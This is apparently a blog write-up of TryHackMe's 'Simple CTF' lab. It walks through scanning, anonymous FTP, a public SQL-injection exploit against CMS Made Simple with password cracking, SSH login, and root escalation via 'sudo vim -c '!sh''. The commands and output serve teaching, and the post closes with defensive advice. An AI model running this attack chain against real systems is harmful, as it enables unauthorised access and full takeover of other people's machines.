---
layout: post
title:  "TryHackMe | Simple CTF"
date:   2021-09-03 22:30:00
tags: [Security, TryHackMe, Pentesting]
style: border
color: primary
description: "TryHackMe Simple CTF Writeup"
---

This is my write-up for the room [Simple CTF](https://tryhackme.com/room/easyctf) on TryHackMe.

![](https://i.imgur.com/epzfhrp.png)

**P.S: I highly encourage you to try solving the challenges on your own first then check this writeup if you are stuck.**


## Reconnaissance
---

Target = `10.10.200.253`

## Enumeration / Scanning
---

Let's start with an initial Nmap scan.

### Service / Port Enumeration

```console
# nmap -oN initialscan.nmap -sS -sV -T4 10.10.200.253

# Nmap 7.91 scan initiated Tue Sep  7 22:03:56 2021 as: nmap -oN scans/initialscan.nmap -sS -sV -T4 10.10.200.253
Nmap scan report for 10.10.200.253
Host is up (0.25s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  7 22:04:23 2021 -- 1 IP address (1 host up) scanned in 27.05 seconds
```

The Nmap scan gives us 3 ports or services.

|Port|State|Service     |Version                                                     |
|----|-----|------------|------------------------------------------------------------|
|21  |open |ftp         |vsftpd 3.0.3                                                |
|80  |open |http        |Apache httpd 2.4.18 ((Ubuntu))                              |
|2222|open |ssh         |OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)|
{:.wide}

### FTP enumeration

First, let's take a closer look at the FTP service.

```console
# nmap -sC -sV -p 21 10.10.242.144                        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 13:52 CDT
Nmap scan report for 10.10.242.144
Host is up (0.37s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.20.137
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.61 seconds
```

Okay looks like an `anonymous` login is allowed on this FTP server. Let's log in.

```console
ftp 10.10.242.144
Connected to 10.10.242.144.
220 (vsFTPd 3.0.3)
Name (10.10.242.144:pyr0): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/" is the current directory
ftp> ls 
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (948.0080 kB/s)
ftp> bye
221 Goodbye.
```

There is a file `ForMitch.txt`. Let's read the contents.

```console
# cat loot/ForMitch.txt     
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

The username is most likely `mitch` and seems like the password he uses can be easily compromised. That said, nothing else we can go off here. Let's move on.

### Web enumeration

Okay, let's visit the site first.

![A picture of the Debian Apache Default Page](https://i.stack.imgur.com/1NOHl.jpg)

It returns the familiar Debian Apache Default page when Apache is first installed. 

Okay, so we've established that there is an apache web server running on the target but nothing stands out yet. Let's see if we can build a small site map of the webserver. You can use dirbuster or gobuster or whatever you like.

```console
# gobuster dir --url http://10.10.242.144/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.242.144/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/08 13:43:37 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]  
/server-status        (Status: 403) [Size: 301]  
/simple               (Status: 301) [Size: 315] [--> http://10.10.242.144/simple/]
                                                                                  
===============================================================
2021/09/08 13:46:24 Finished
===============================================================
```

Now let’s explore the hidden directories we found. Let’s check out robots.txt as it might give us some useful information.

```console
# wget http://10.10.242.144/robots.txt
--2021-09-08 14:05:20--  http://10.10.242.144/robots.txt
Connecting to 10.10.242.144:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 929 [text/plain]
Saving to: ‘robots.txt’

robots.txt                   100%[==============================================>]     929  --.-KB/s    in 0s      

2021-09-08 14:05:21 (43.7 MB/s) - ‘robots.txt’ saved [929/929]
```

```console                    
# cat robots.txt

#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

Nothing really in the `robots.txt` file that stands out.

Moving forward we have a directory called `simple` that returned a successful web response code from our scan earlier. Upon visiting that directory we are greeted with a web page that hosts a CMS (Content Management System) called ***CMS Made Simple***. 

![CMS made simple web page](https://i.imgur.com/AE1RKHm.png)

Just from browsing the page a little bit we also deduce some other information such as users active and version info on the CMS. This is called ***low-tech hacking***.

![CMS user mitch info from a post on the site](https://i.imgur.com/xqAyzwA.png)

![CMS made simple version info](https://i.imgur.com/y1TZZWr.png)

So we now have the following:
- A possible user `mitch`
- CMS made simple version-info 2.2.8

Let's browse through `searchsploit` and see if we can find more information about this cms. 

```console
# searchsploit CMS Made Simple 2.2.8 -w
----------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                         |  URL
----------------------------------------------------------------------- --------------------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                               | https://www.exploit-db.com/exploits/46635
----------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
```

Looking at `searchsploit` we find a SQL injection vulnerability for CMS made simple versions lower than 2.2.10. 

Upon visiting the URL path to exploit-db [https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635) we discover a downloadable python script to do the exploitation for us. 

![CMS made simple exploit-db info](https://i.imgur.com/BagY0DA.png)

## Gaining Access / Exploitation
---

Once you've downloaded the python script be sure to use `chmod +x` like the example below:

```console
# chmod +x 46635.py
```

Now, all we have to do is point the script to our target.

```console
# python2.7 ./toolbox/46635.py -u http://10.10.242.144/simple/ --crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

Cracked! This confirmed the username `mitch` and gave us a password hash with a salt as well as the password `secret` in cleartext. Important note you could have also cracked the hash with the salt using `hashcat`. With the credentials below, we can `ssh` into the target.

>**Username:** mitch

>**Password:** secret

```console
# ssh mitch@10.10.242.144 -p 2222                                                                  
The authenticity of host '[10.10.242.144]:2222 ([10.10.242.144]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.242.144]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.242.144's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$
```

## Maintaining Access / Priviledge Escalation
---

Upon exploring the target we find a flag.

```console
$ ls
user.txt
$ cat user.txt  
G00d j0b, keep up!
$
```

We also find another user.

```console
$ ls /home
mitch  sunbath
$
```

Let’s find out a way to get escalate our privileges.

```console
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$
```

So we see the user `mitch` can run `vim`. Let’s run `vim` to escalate our privilege via a bash shell.

```console
$ sudo vim -c '!sh'

# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
#
```

Now we can navigate to the root directory and retrieve the final flag.

```console
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
#
```

## Conclusion
---

So what can we learn from this?

- We get a feel for how CTFs work and what flags are
- Make sure the system and services are up to date
- Enforce strong passwords
- Be aware of binaries that can be executed as system or root
